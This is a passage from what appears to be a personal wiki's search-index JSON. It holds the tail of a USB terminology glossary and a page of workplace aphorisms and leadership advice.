installed.\nHost Controller # Host\u0026rsquo;s USB interface.\nHost Controller (HCD) # USB Software layer that abstracts the Host Controller Hardware.\nInterrupt Request (IRQ) # Signal to request attention from the host.\nInterrupt Transfer # One of the 4 USB transfer types. Small data, non-periodic, low-frequency and bounded-latency.\nI/O Request Packet (IRP) # An identifiable request by a software client to move data between itself and an endpoint of a device in appropriate direction.\nIsochronous Data # Stream of data whose timing is implied by its delivery rate.\nIsochronous Device # An entity with Isochronous endpoints.\nJitter # Lack of synchronization.\nMessage Pipe # Bi-directional pipe that transfers data using a request/data/status paradigm.\nMicroframe # A 125 microseconds time base on high speed buses\nNAK # Rejecting handshake package\nObject # Host software or data structure representing a USB entity.\nPacket # A bundle of data organized in a group of transmission. Packets typically contain three elements:\nControl information (source, destination and length) Data to be transferred Error detection and correction bits Packet ID (PID) # A field in packet that indicates the type of packet. By inference it indicates the format of the packet and the type of error detection.\nPhase # A token, data or handshake packet. A transaction has 3 phases.\nPipe # Abstraction of the association between an endpoint of the device and the software on the host. A pipe has several attributes. So we have stream pipe\u0026rsquo;s and message pipes.\nPolling # Asking (multiple) devices if they have any data to trasmit.\nPower on Reset (POR) # Restoring a storage device, register or memory to a predetemrined state when power is applied.\nPort # Point of access to or from a system or circuit.\nRate Adaption (RA) # Adapting the rate of a data stream with certain loss of quality.\nRequest # A request made to a USB device contained within the data portion of a SETUP packet.\nService # A procedure provided by a System Programming Interface (ISP)\nSOF (Start Of Frame) # SOP (Start of Packet) # SRC (Sample Rate Conversion) # TDM (Time Division Multiplexing) # TDR (Time Domain Reflectometer) # Token Packet # A type of paket that identifies what transaction is to be performed on the bus.\nTransfer # One ore more transactions to move information.\nTransfer Type # Determines the characteristics of the data flow. Types\nControl Inerrupt Bulk Ischronous USB-IF # USB Implementers Forum\nVirtual Device # A device that i represented by a software interface layer.\nWord # 2 bytes.\n"},{"id":115,"href":"/wisdom/","title":"Wisdom","section":"","content":" Wisdom # Best way to get feedback or an answer, by posting a wrong answer\nComparison is the mental thief of joy\nThe best thing you can do with a good reputation is squander it, because you canât take it with you when youâre dead.\nYour problem and challenges are not unique - find others that solved it\nAlways assume good intent\nJust do it, don\u0026rsquo;t ask for permission, people will resist or take things from you away if you\u0026rsquo;re doing a bad job.\nDefine the role you want, don\u0026rsquo;t fill in that they say.\nA talent for following the ways of yesterday, is not sufficient to improve the world of today King Wuling 307 BC\nâa lie can travel halfway around the world while the truth is still putting on its shoesâ\nEasy and Fast is what allows for innovation.\nFocus on productivity first and portability second. If you\u0026rsquo;re not productive (and your competitors are), you\u0026rsquo;ll have nothing to port.\nBusiness plans that describe how you would capture a small slice of a vast market are the first ones to go into the trash bin. Instead, we look for ideas that serve one market better than anyone else in that market.\nThe best engineering metrics have 3 features:\nthere are multiple of them they\u0026rsquo;re in tension with each other they measure teams or the organizationânot individuals Leadership / Influence # Usually, you might have good ideas, but listen to everyone first, then âhey, at least 3 of you said we should do x, what do you think?â. You might have planted some ideas before, (read how) but then make sure they feel they were part of the decision. This will give more buy in and conviction. Remember the expensive consultant example. An good consultant just surfaces the ideas of those who are there and know it without taking credit. Do a listening tour This is an example of a leader that pulls, instead of pushing (telling what to do). So pulling doesnât mean âsay what to do and then step alongâ, no.\n"}]